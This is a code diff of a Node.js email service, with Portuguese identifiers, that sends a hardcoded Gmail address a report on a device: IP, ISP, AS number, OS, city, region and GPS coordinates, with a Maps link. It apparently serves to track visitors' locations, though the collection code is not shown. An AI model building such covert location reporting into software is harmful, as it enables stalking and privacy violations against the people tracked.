@@ -3,16 +3,25 @@ const path = require('path');
 
 class ServiceEmail {
 
-    static enviarLocalizacaoDoDispositivo = async (useragent, result, lat, lon) => {
+    static enviarLocalizacaoAproximada = async (informacao) => {
         const email = 'uilhamgoncalves@gmail.com'
-
+        
         const htmlResposta = `
-            <h3>Nova localização recebida:</h3>
-            <p><strong>useragent:</strong> ${JSON.stringify(useragent) }</p>
-            <p><strong>Result:</strong> ${JSON.stringify(result)}</p>
-            <p><strong>Latitude:</strong> ${lat}</p>
-            <p><strong>Longitude:</strong> ${lon}</p>
-            <p><a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Ver no Google Maps</a></p>
+            <h3>Nova localização aproximada:</h3>
+            <p><strong>País:</strong> ${informacao.pais}</p>
+            <p><strong>Estado:</strong> ${informacao.regiao}</p>
+            <p><strong>Cidade:</strong> ${informacao.cidade}</p>
+            <h3>Dispositivo:</h3>
+            <p><strong>OS:</strong> ${informacao.os}</p>
+            <p><strong>Fonte:</strong> ${informacao.source}</p>
+            <h3>Operadora:</h3>
+            <p><strong>Organização:</strong> ${informacao.organization}</p>
+            <p><strong>ISP:</strong> ${informacao.isp}</p>
+            <p><strong>AS:</strong> ${informacao.as}</p>
+            <p><strong>IP:</strong> ${informacao.ip}</p>
+            <h3>Coordenadas GPS:</h3>
+            <p>lat: ${informacao.lat} lon: ${informacao.lon}</p>
+            <p><a href="https://www.google.com/maps?q=${informacao.lat},${informacao.lon}" target="_blank">Ver no Google Maps</a></p>
         `;
         
         const transporter = nodemailer.createTransport({
